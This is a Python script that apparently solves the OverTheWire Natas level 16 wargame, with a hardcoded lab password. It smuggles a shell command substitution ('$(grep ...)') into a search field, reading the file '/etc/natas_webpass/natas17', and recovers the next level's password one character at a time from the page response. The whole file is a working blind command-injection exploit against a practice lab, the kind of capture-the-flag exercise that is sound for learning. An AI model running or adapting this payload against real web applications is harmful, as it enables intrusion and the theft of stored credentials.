#Import Library
import requests
import re
from string import *

#Setting variables needed
username = 'natas16'
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'

url = f'http://{username}.natas.labs.overthewire.org/'
pw = []
flag = True
characters = ascii_letters + digits

# Connect to natas
session = requests.Session()
while flag:
    for c in characters:
        print(''.join(pw) + c)
        flag = False
        payloads={"needle" : "anythings$(grep ^" + "".join(pw) + c + " /etc/natas_webpass/natas17)"}
        response = session.request('POST', url, auth=(username,password), data=payloads)
        if not re.findall("<pre>\n(.*)\n</pre>", response.text, re.DOTALL):
            pw.append(c)
            flag = True
            break
            
print(''.join(pw))
